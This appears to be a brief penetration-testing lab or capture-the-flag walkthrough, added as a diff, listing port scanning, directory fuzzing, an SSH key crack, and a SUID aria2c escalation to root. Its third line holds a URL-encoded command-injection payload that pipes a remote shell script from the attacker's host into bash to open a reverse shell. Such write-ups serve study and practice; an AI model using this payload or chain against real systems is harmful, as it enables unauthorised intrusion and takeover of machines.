@@ -1,0 +1,11 @@
+- nmap scan reveals 80 and 22 port only
+- Directory fuzzing with gobuster found /page
+- LFI on the page url http://192.168.207.94/index.php?page=%27%20and%20die(system(%22curl%20http://192.168.45.225:8080/rshell.sh%20|%20bash%22))%20or%20%27 #LFI #command_injection
+- Got the revshell.
+- Found ssh private key on tge todeletelater folder
+- ssh2john gives us the passkey 
+- from passkey we got the username hint
+- Log into soz user with ssh private key
+- SUID found aria2c #suid_privesc 
+- Got the root shell by replacing the passwd file.
+
